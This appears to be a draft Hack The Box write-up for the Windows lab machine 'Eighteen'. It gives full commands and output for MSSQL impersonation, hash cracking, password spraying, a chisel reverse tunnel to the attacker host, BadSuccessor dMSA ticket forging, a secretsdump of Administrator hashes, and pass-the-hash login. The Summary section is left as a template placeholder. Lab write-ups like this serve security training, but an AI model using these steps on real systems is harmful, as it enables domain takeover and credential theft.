---
title: "HTB: Eighteen"
date: 2026-03-26
excerpt: Easy windows machine; easy foothold - tricky root
readingTime: 1
tags:
  - HTB
  - Writeup
  - Windows
  - Easy
  - badsuccessor
  - MSSQL
  - evil-winrm
  - winrm
  - Hacking
author: pir4cy
coverImage: /images/htb/covers/eighteen-cover.png
draft: true
---

# Eighteen

## Info  
  * IP: 10.129.12.107
  * OS: Windows
  * Difficulty: Easy

## Initial Reconnaissance

### NMAP

![Nmap Scan](/images/htb/machines/eighteen/nmap.png "NMAP")

### Web Enumeration (if applicable)

![Web Page](/images/htb/machines/eighteen/webpage.png "Web Page")

## Exploitation

bazically, provided credentials can be used to login using impacket-mssqlclient. Before the login, we use nxc to validate credentials and find other users (--rid-brute)

After logging in, let's see if we can impersonate another user with higher privileges
```
enum_impersonate
```

We can impersonate `appdev`.
```
exec_as_login appdev
```

Enumerated the database and found credentials for `admin`
```
$pkbdf2$sha256$60000$......$....
```
pkbdf2-sha256 can be cracked using hashcat, however given the iterations (60k), it was taking forever to crack using hashcat.

We can create a python script and use multiprocessing to crack it faster. LLMs are good enough for this.

```
└─$ py  python3 admin-crack.py
[*] Loaded 14344392 passwords
[*] Using 4 CPU cores
[+] Password found: iloveyou1

```

Let's spray this password across all users and see if we get a hit.
```
└─$ nxc winrm dc01.eighteen.htb -u users.txt -p iloveyou1             
WINRM       10.129.13.152   5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) 
WINRM       10.129.13.152   5985   DC01             [-] eighteen.htb\Administrator:iloveyou1
WINRM       10.129.13.152   5985   DC01             [-] eighteen.htb\krbtgt:iloveyou1
WINRM       10.129.13.152   5985   DC01             [-] eighteen.htb\mssqlsvc:iloveyou1
WINRM       10.129.13.152   5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1
WINRM       10.129.13.152   5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1
WINRM       10.129.13.152   5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1
WINRM       10.129.13.152   5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)

```

Jackpot - we can use winrm to login as adam.scott!

### Gaining Initial Access

```
evil-winrm -i <ip of box> -u adam.scott -p iloveyou1
```

## Privilege Escalation

### BadSuccessor - Abusing dMSA write privileges
Enumerating the system, we see that it's Windows Server 2025 with dmsa enabled. We can attempt the BadSuccessor attack and escalate privileges using a malicious dmsa. In order to perform the attack, we would also need to reach the kerberos port that is only accessible internally. We can tunnel using chisel, I tried ligolo as well but it just wasn't working for me, something to do with htb vpn messing with ligolo setup. 

On my kali machine
```
└─$ chisel server -p 8011 --reverse
2026/03/26 04:56:59 server: Reverse tunnelling enabled
2026/03/26 04:56:59 server: Fingerprint wsGSNdWFI9yQ4UDLwFhpRiZ7szAd5iv4sVhzoeZ22ME=
2026/03/26 04:56:59 server: Listening on http://0.0.0.0:8011

```

> Make sure that you are using the IP of the machine to connect using evil-winrm. If you're using hostname, the connection will break after tunnelling.

 erforming the attack and running chisel agent
```
*Evil-WinRM* PS C:\Users\adam.scott\Documents\hex> upload BadSuccessor.ps1 

Info: Uploading /home/pir4cy/eighteen/BadSuccessor.ps1 to C:\Users\adam.scott\Documents\hex\BadSuccessor.ps1                                          
Data: 21284 bytes of 21284 bytes copied
  
Info: Upload successful!
*Evil-WinRM* PS C:\Users\adam.scott\Documents\hex> upload chisel.exe

Info: Uploading /home/pir4cy/eighteen/chisel.exe to C:\Users\adam.scott\Documents\hex\chisel.exe                                                     
Data: 14575616 bytes of 14575616 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\adam.scott\Documents\hex> . .\BadSuccessor.ps1
*Evil-WinRM* PS C:\Users\adam.scott\Documents\hex> BadSuccessor -Mode Exploit -Domain "eighteen.htb" -Path "OU=Staff,DC=eighteen,DC=htb" -Name "hex_dmsa" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" 
Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb
0
0
0
0
Successfully created and configured dMSA 'hex_dmsa'
Object adam.scott can now impersonate Administrator
*Evil-WinRM* PS C:\Users\adam.scott\Documents\hex> ./chisel.exe client 10.10.14.74:8011 R:socks
chisel.exe : 2026/03/26 02:00:42 client: Connecting to ws://10.10.14.74:8011
    + CategoryInfo          : NotSpecified: (2026/03/26 02:0...0.10.14.74:8011:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2026/03/26 02:00:42 client: Connected (Latency 25.5456ms)
```

With the connection in place, you'll see something like below on your machine
```
2026/03/26 09:23:31 server: session#7: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Now, in a new terminal, make sure to update your hosts file. Since we're listening on localhost and kerberos uses hostnames instead of IPs, we want to make sure that our hosts file reflect the correct hosts.
```cat /etc/hosts
127.0.0.1 eighteen.htb dc01.eighteen.htb
```

Alright, let's give it a shot. 

In a new terminal, open another winrm session.
```
*Evil-WinRM* PS C:\Users\adam.scott\Documents\hex> . .\BadSuccessor.ps1
*Evil-WinRM* PS C:\Users\adam.scott\Documents\hex> BadSuccessor -Mode Exploit -Domain "eighteen.htb" -Path "OU=Staff,DC=eighteen,DC=htb" -Name "hex_dmsa" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator"
Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb
0
0
0
0
Successfully created and configured dMSA 'hex_dmsa'
Object adam.scott can now impersonate Administrator
```

On your kali machine,
```
└─$ proxychains impacket-getST -impersonate 'hex_dmsa$' -dmsa eighteen.htb/adam.scott -self
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Impersonating hex_dmsa$
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:6035fd3106ce46a1dd014ff72d5679fe9b5c37ef5fe058bf21fbcd7218c37438
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:fef405f3f3f9470c98d6ff50b0f2e52b
[*] EncryptionTypes.rc4_hmac:c584d4729f21e9cb6ae2a226d2dad62c
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in hex_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

We now have a ticket with Administrator privileges. Let's use this ticket to dump credentials.

```
┌──(pir4cy㉿kali)-[~/eighteen]
└─$ export KRB5CCNAME=hex_dmsa\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
        
┌──(pir4cy㉿kali)-[~/eighteen]
└─$ proxychains impacket-secretsdump -k -no-pass dc01.eighteen.htb -just-dc-user Administrator
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:49672  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
[*] Kerberos keys grabbed
Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
Administrator:0x17:0b133be956bfaddf9cea56701affddec
[*] Cleaning up...                                                     
```

Using the NT hash of the Administrator account we can now login using evil-winrm again with the `-H <hash>` flag.
```    
┌──(pir4cy㉿kali)-[~/eighteen]
└─$ evil-winrm -u Administrator -H 0b133be956bfaddf9cea56701affddec -i 10.129.12.107
```

And we are root!

## Summary

[Brief summary of the machine, key learnings, and techniques used]

